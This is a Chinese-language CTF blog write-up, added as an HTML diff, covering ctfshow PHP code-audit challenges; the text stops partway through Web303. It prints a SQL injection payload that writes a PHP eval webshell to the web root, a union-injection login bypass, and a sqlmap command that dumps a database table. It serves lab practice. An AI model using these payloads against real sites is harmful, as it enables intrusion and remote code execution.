@@ -1,0 +1,2017 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="前言 正好最近省赛的复现有点php代码审计的苗头了，正好看到ctfshow里面也有代码审计的模块，这里写一写 Web301 知识点：sql写马、联合注入创建">
+<title>ctfshow代码审计</title>
+
+<link rel='canonical' href='http://localhost:1313/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="ctfshow代码审计">
+<meta property='og:description' content="前言 正好最近省赛的复现有点php代码审计的苗头了，正好看到ctfshow里面也有代码审计的模块，这里写一写 Web301 知识点：sql写马、联合注入创建">
+<meta property='og:url' content='http://localhost:1313/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/'>
+<meta property='og:site_name' content='liernian'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-11-23T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-11-23T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="ctfshow代码审计">
+<meta name="twitter:description" content="前言 正好最近省赛的复现有点php代码审计的苗头了，正好看到ctfshow里面也有代码审计的模块，这里写一写 Web301 知识点：sql写马、联合注入创建">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu11319725144555339807.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">💯</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">liernian</a></h1>
+            <h2 class="site-description">理想主义的中二少年</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="http://localhost:1313/en/" >English</option>
+                                
+                                    <option value="http://localhost:1313/" selected>简体中文</option>
+                                
+                                    <option value="http://localhost:1313/ar/" >عربي</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#web301">Web301</a>
+      <ol>
+        <li><a href="#知识点sql写马联合注入创建用户">知识点：sql写马、联合注入创建用户</a></li>
+      </ol>
+    </li>
+    <li><a href="#web302">Web302</a>
+      <ol>
+        <li><a href="#知识点sql依旧写马">知识点：sql依旧写马</a></li>
+      </ol>
+    </li>
+    <li><a href="#web303">Web303</a>
+      <ol>
+        <li><a href="#知识点sqlmap跑盲注">知识点：sqlmap跑盲注</a></li>
+      </ol>
+    </li>
+    <li><a href="#web304">Web304</a>
+      <ol>
+        <li><a href="#知识点同上">知识点：同上</a></li>
+      </ol>
+    </li>
+    <li><a href="#web305">Web305</a>
+      <ol>
+        <li><a href="#知识点项目反序列化写马">知识点：项目反序列化写马</a></li>
+      </ol>
+    </li>
+    <li><a href="#web306">Web306</a>
+      <ol>
+        <li><a href="#知识点构造反序列化链写马">知识点：构造反序列化链写马</a></li>
+      </ol>
+    </li>
+    <li><a href="#web307">Web307</a>
+      <ol>
+        <li><a href="#知识点项目反序列化链命令注入">知识点：项目反序列化链命令注入</a></li>
+      </ol>
+    </li>
+    <li><a href="#web308">Web308</a>
+      <ol>
+        <li><a href="#知识点项目反序列化链ssrf打mysql">知识点：项目反序列化链ssrf打mysql</a></li>
+      </ol>
+    </li>
+    <li><a href="#web309">Web309</a>
+      <ol>
+        <li><a href="#知识点gopher协议探测端口打fastcgi">知识点：gopher协议探测端口，打<code>FastCGI</code></a></li>
+      </ol>
+    </li>
+    <li><a href="#web310">Web310</a>
+      <ol>
+        <li><a href="#知识点同上-1">知识点：同上</a></li>
+      </ol>
+    </li>
+    <li><a href="#总结">总结</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/web/" >
+                Web
+            </a>
+        
+            <a href="/categories/wp/" >
+                Wp
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">ctfshow代码审计</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-11-23</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 8 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="前言">前言
+</h2><p>正好最近省赛的复现有点php代码审计的苗头了，正好看到<code>ctfshow</code>里面也有代码审计的模块，这里写一写</p>
+<h2 id="web301">Web301
+</h2><h3 id="知识点sql写马联合注入创建用户">知识点：sql写马、联合注入创建用户
+</h3><p>文件结构如下</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251123144019748.png"
+	width="375"
+	height="692"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251123144019748_hu5012924376770051899.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251123144019748_hu106068852024367336.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251123144019748"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="54"
+		data-flex-basis="130px"
+	
+></p>
+<p>在checklogin.php中一眼定真，直接凭借的sql语句，直接开打sql注入</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251123164303689.png"
+	width="1511"
+	height="769"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251123164303689_hu15521798186151731187.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251123164303689_hu6993472419186279896.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251123164303689"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="196"
+		data-flex-basis="471px"
+	
+></p>
+<p>这里直接sql写马，审了个寂寞</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">userid</span><span class="o">=</span><span class="n">admin</span><span class="s1">&#39; into outfile &#39;</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="mf">12.</span><span class="n">php</span><span class="s1">&#39; lines terminated by &#39;</span><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="err">?</span><span class="o">&gt;</span><span class="s1">&#39;--+</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251123171716555.png"
+	width="1411"
+	height="733"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251123171716555_hu12336193777483721841.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251123171716555_hu6113401426705117558.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251123171716555"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="192"
+		data-flex-basis="461px"
+	
+></p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251123171640533.png"
+	width="1549"
+	height="1003"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251123171640533_hu5341478698808266084.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251123171640533_hu11503930007300182285.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251123171640533"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="154"
+		data-flex-basis="370px"
+	
+></p>
+<p>flag在当前目录下的flag.php直接cat就行了，另外这道题正常做法还可以用联合注入伪造虚拟数据登录进去就可以访问flag.php了</p>
+<p>这里当作练习，就都尝试一下吧</p>
+<p>在联合查询并不存在得数据时，联合查询就会构造一个<code>虚拟得数据</code>就相当于构造了一个虚拟账户，可以使用这个账户登录。当然作用局限性也很大，比如说后端如果限制你必须用admin登录，那你不炸了</p>
+<p>第一次知道联合注入可以这样打</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128090919086.png"
+	width="1158"
+	height="471"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128090919086_hu3294462182998047755.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128090919086_hu11322276746889197451.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251128090919086"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="245"
+		data-flex-basis="590px"
+	
+></p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128090921947.png"
+	width="1766"
+	height="741"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128090921947_hu16622646567775966921.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128090921947_hu7787183084372074056.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251128090921947"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="238"
+		data-flex-basis="571px"
+	
+></p>
+<h2 id="web302">Web302
+</h2><h3 id="知识点sql依旧写马">知识点：sql依旧写马
+</h3><p>代码修改如下照样写马</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128092849009.png"
+	width="728"
+	height="69"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128092849009_hu3045995175061527463.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128092849009_hu5730560451348324982.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251128092849009"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1055"
+		data-flex-basis="2532px"
+	
+></p>
+<p>这里改的是</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128092934162.png"
+	width="1251"
+	height="677"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128092934162_hu17787011400905720714.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128092934162_hu5383501833267861053.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251128092934162"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="184"
+		data-flex-basis="443px"
+	
+></p>
+<p>显然是加固了一下，这里判断的条件导致联合注入没那么无脑了，因为这个是和数据库中的字符做比较。</p>
+<p>可以打联合注入虚拟数据，可以通过源码中的代码对密码进行加密，就可以了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">sds_decode</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$str</span><span class="o">.</span><span class="nx">md5</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="s2">&#34;sds&#34;</span><span class="p">)))</span><span class="o">.</span><span class="s2">&#34;sds&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>写马还是照样</p>
+<p>写马还是要抓包，不抓包写不了</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128111049535.png"
+	width="1239"
+	height="886"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128111049535_hu6298522978654612205.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128111049535_hu11999380815074984911.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251128111049535"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="139"
+		data-flex-basis="335px"
+	
+></p>
+<p>这里还不能url编码，一直想学习一下这个，服务端处理请求报文的逻辑。</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128111424341.png"
+	width="653"
+	height="106"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128111424341_hu5648710496355756819.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128111424341_hu9774874375999055618.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251128111424341"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="616"
+		data-flex-basis="1478px"
+	
+></p>
+<h2 id="web303">Web303
+</h2><h3 id="知识点sqlmap跑盲注">知识点：sqlmap跑盲注
+</h3><p>换了附件，但是项目结构是一样的</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128113853736.png"
+	width="339"
+	height="712"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128113853736_hu16025248363200667077.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128113853736_hu17052201703272635077.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251128113853736"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="47"
+		data-flex-basis="114px"
+	
+></p>
+<p>貌似多了一些东西，来简单审计一下，首先还是<code>checklogin.php</code>，这里队sql注入点加了限长，sql注入应该是无法利用了</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128114214804.png"
+	width="1356"
+	height="759"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128114214804_hu702072023732900361.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128114214804_hu10667515338892663535.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251128114214804"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="178"
+		data-flex-basis="428px"
+	
+></p>
+<p>看看多出来的<code>dpt.php</code>和<code>dptadd.php</code></p>
+<p><code>dpt.php</code>都是一些前端<code>dptadd.php</code>则存在新的SQL注入点，这里只要控制dpt_name参数就可以执行sql注入了</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128142544521.png"
+	width="2117"
+	height="807"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128142544521_hu784911860821020412.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128142544521_hu14868409034977791768.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251128142544521"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="262"
+		data-flex-basis="629px"
+	
+></p>
+<p>但是新的问题来了，访问这个页面是需要<code>login</code>的<code>session</code>的，否则会重定向回<code>login.php</code>。</p>
+<p>但是<code>fun.php</code>这里输出了<code>sds_decode</code>(&quot;<code>admin</code>&quot;)，感觉也是一种变相的提示密码就是<code>admin</code>（其实直接爆破也可以）</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128144133389.png"
+	width="753"
+	height="160"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128144133389_hu4076483423377320748.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128144133389_hu5463689437151198536.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251128144133389"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="470"
+		data-flex-basis="1129px"
+	
+></p>
+<p>成功登录之后尝试访问<code>dptadd.php</code>，成功，显示出来的也是之前的<code>insert</code>语句</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128144817427.png"
+	width="1884"
+	height="693"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128144817427_hu16975647917298043097.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128144817427_hu3393982499203711316.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251128144817427"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="271"
+		data-flex-basis="652px"
+	
+></p>
+<p>直接用<code>sqlmap</code>跑一下，无绕过的sql注入还是太简单了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python sqlmap.py -r bp.txt -p dpt_name -D sds -T sds_fl9g --dump --technique=B
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128154908537.png"
+	width="1676"
+	height="786"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128154908537_hu4456244478807420500.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128154908537_hu2192909227246085320.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251128154908537"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="213"
+		data-flex-basis="511px"
+	
+></p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128155638899.png"
+	width="1029"
+	height="223"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128155638899_hu3851716865629272770.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128155638899_hu8702077416899761184.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251128155638899"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="461"
+		data-flex-basis="1107px"
+	
+></p>
+<p>手打的话也挺简单，因为<code>insert</code>语句本身就是插入语句，里面是可以嵌套<code>select</code>的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
